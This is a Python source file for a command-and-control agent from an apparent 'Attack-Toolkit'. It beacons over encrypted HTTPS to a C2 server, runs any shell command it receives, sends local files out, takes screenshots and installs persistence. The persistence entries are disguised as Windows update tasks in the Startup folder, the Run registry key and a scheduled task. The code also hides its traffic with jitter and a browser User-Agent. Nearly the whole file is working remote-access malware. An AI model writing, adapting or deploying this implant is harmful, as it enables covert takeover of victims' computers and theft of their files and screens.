#!/usr/bin/env python3
"""
Attack-Toolkit — C2 Agent / Client
HTTPS beacon with AES-256 encrypted comms, jitter sleep, auto-reconnect,
special command handling (upload, download, sleep, die, screenshot, persist).
Requires: pip install cryptography requests pyautogui pillow
"""

import argparse
import base64
import json
import os
import platform
import random
import socket
import subprocess
import sys
import time
import uuid
import urllib3
from hashlib import sha256

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("[-] requests not installed. pip install requests")
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    print("[-] cryptography not installed. pip install cryptography")
    sys.exit(1)

# ─── config (override via args or env) ─────────────────────────────────────────
C2_HOST      = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT      = int(os.environ.get("C2_PORT", "8443"))
PASSWORD     = os.environ.get("C2_PASS", "changeme_strong_password")
SLEEP_MIN    = int(os.environ.get("SLEEP_MIN", "5"))
SLEEP_MAX    = int(os.environ.get("SLEEP_MAX", "15"))
MAX_BACKOFF  = 120   # seconds — exponential backoff ceiling
SALT         = b"paralel3pido_c2_salt_2024"

AGENT_UUID   = str(uuid.uuid4())
master_key: bytes = b""


# ═══════════════════════════════════════════════════════════════════════════════
# Crypto (mirrors server)
# ═══════════════════════════════════════════════════════════════════════════════
def derive_key(password: str) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=100_000,
        backend=default_backend(),
    )
    return kdf.derive(password.encode())


def aes_encrypt(data: bytes) -> bytes:
    iv = os.urandom(16)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    return base64.b64encode(iv + ct)


def aes_decrypt(b64_data: bytes) -> bytes:
    raw = base64.b64decode(b64_data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ct) + dec.finalize()
    unpadder = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


def encrypt_payload(obj: dict) -> str:
    return aes_encrypt(json.dumps(obj).encode()).decode()


def decrypt_payload(token: str) -> dict:
    return json.loads(aes_decrypt(token.encode()).decode())


# ═══════════════════════════════════════════════════════════════════════════════
# System info
# ═══════════════════════════════════════════════════════════════════════════════
def get_sysinfo() -> dict:
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "unknown"
    return {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER", "?"),
        "os":       platform.platform(),
        "ip":       ip,
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Command handlers
# ═══════════════════════════════════════════════════════════════════════════════
def handle_shell(cmd_data: str) -> str:
    try:
        out = subprocess.check_output(
            cmd_data, shell=True, stderr=subprocess.STDOUT,
            timeout=60
        )
        return out.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[!] Command timed out."
    except subprocess.CalledProcessError as e:
        return (e.output or b"").decode(errors="replace")
    except Exception as e:
        return f"[!] Error: {e}"


def handle_download(remote_path: str, session: requests.Session, c2_url: str) -> str:
    """Read a file on the agent and upload it to the server's /upload endpoint."""
    try:
        path = os.path.expandvars(os.path.expanduser(remote_path))
        with open(path, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        payload = {
            "uuid":     AGENT_UUID,
            "filename": os.path.basename(path),
            "content":  content,
        }
        session.post(c2_url.replace("/beacon", "/upload"),
                     data=encrypt_payload(payload), verify=False, timeout=30)
        return f"[+] Uploaded {path} ({len(content)} b64 chars)"
    except Exception as e:
        return f"[-] Download error: {e}"


def handle_upload(filename: str, content_b64: str) -> str:
    """Write a file pushed from the server to local CWD."""
    try:
        path = os.path.join(os.getcwd(), os.path.basename(filename))
        with open(path, "wb") as f:
            f.write(base64.b64decode(content_b64))
        return f"[+] File written: {path}"
    except Exception as e:
        return f"[-] Upload error: {e}"


def handle_screenshot() -> str:
    """Capture screen via PIL/pyautogui; return base64 PNG."""
    try:
        import pyautogui
        from io import BytesIO
        buf = BytesIO()
        pyautogui.screenshot().save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except ImportError:
        return "[-] pyautogui not available."
    except Exception as e:
        return f"[-] Screenshot error: {e}"


def handle_persist(method: str) -> str:
    """Install persistence using the requested method."""
    exe = sys.executable
    script = os.path.abspath(__file__)
    cmd_str = f'"{exe}" "{script}"'

    try:
        if method == "startup":
            # Windows startup folder
            startup = os.path.join(
                os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            bat = os.path.join(startup, "updater.bat")
            with open(bat, "w") as f:
                f.write(f"@echo off\nstart /b {cmd_str}\n")
            return f"[+] Startup batch written: {bat}"

        elif method == "registry":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, cmd_str)
            winreg.CloseKey(key)
            return "[+] Registry Run key set (HKCU)."

        elif method == "schtask":
            task = (
                f'schtask /create /tn "WindowsUpdateHelper" /tr "{cmd_str}" '
                f'/sc onlogon /rl highest /f'
            )
            subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
            return "[+] Scheduled task created."

        else:
            return f"[-] Unknown persist method: {method}"
    except Exception as e:
        return f"[-] Persist error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# Beacon loop
# ═══════════════════════════════════════════════════════════════════════════════
def beacon_loop(c2_url: str, session: requests.Session):
    global SLEEP_MIN, SLEEP_MAX

    sysinfo = get_sysinfo()
    backoff = 5
    first = True

    while True:
        try:
            payload: dict = {"uuid": AGENT_UUID}
            if first:
                payload.update(sysinfo)
                first = False

            body = encrypt_payload(payload)
            resp = session.post(c2_url, data=body, verify=False, timeout=20)

            if resp.status_code == 200:
                backoff = 5  # reset on success
                try:
                    data = decrypt_payload(resp.text)
                except Exception:
                    data = {}

                cmd   = data.get("cmd", {})
                op    = cmd.get("op", "noop")
                cmd_id = data.get("cmd_id", "")

                result = None

                if op == "noop":
                    pass

                elif op == "shell":
                    result = handle_shell(cmd.get("data", ""))

                elif op == "download":
                    result = handle_download(cmd.get("path", ""), session, c2_url)

                elif op == "upload":
                    result = handle_upload(cmd.get("filename", "file"), cmd.get("content", ""))

                elif op == "screenshot":
                    result = handle_screenshot()

                elif op == "persist":
                    result = handle_persist(cmd.get("method", "registry"))

                elif op == "sleep_cfg":
                    SLEEP_MIN = int(cmd.get("min", SLEEP_MIN))
                    SLEEP_MAX = int(cmd.get("max", SLEEP_MAX))
                    result = f"[+] Sleep jitter set: {SLEEP_MIN}–{SLEEP_MAX}s"

                elif op == "die":
                    sys.exit(0)

                # send result on next beacon if we have one
                if result is not None and cmd_id:
                    rp = {"uuid": AGENT_UUID, "result_id": cmd_id, "result": result}
                    try:
                        session.post(c2_url, data=encrypt_payload(rp), verify=False, timeout=20)
                    except Exception:
                        pass

        except Exception:
            # silent — auto-reconnect with exponential backoff
            time.sleep(min(backoff, MAX_BACKOFF))
            backoff = min(backoff * 2, MAX_BACKOFF)
            continue

        # jitter sleep
        time.sleep(random.uniform(SLEEP_MIN, SLEEP_MAX))


# ═══════════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(description="C2 Agent — HTTPS AES-256")
    parser.add_argument("--host",       default=C2_HOST,    help="C2 server host")
    parser.add_argument("--port",       default=C2_PORT,    type=int, help="C2 server port")
    parser.add_argument("--password",   default=PASSWORD,   help="Shared AES key password")
    parser.add_argument("--sleep-min",  default=SLEEP_MIN,  type=int, help="Min sleep seconds")
    parser.add_argument("--sleep-max",  default=SLEEP_MAX,  type=int, help="Max sleep seconds")
    args = parser.parse_args()

    global master_key, SLEEP_MIN, SLEEP_MAX
    master_key = derive_key(args.password)
    SLEEP_MIN  = args.sleep_min
    SLEEP_MAX  = args.sleep_max

    c2_url = f"https://{args.host}:{args.port}/beacon"

    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/octet-stream",
    })

    beacon_loop(c2_url, session)


if __name__ == "__main__":
    main()
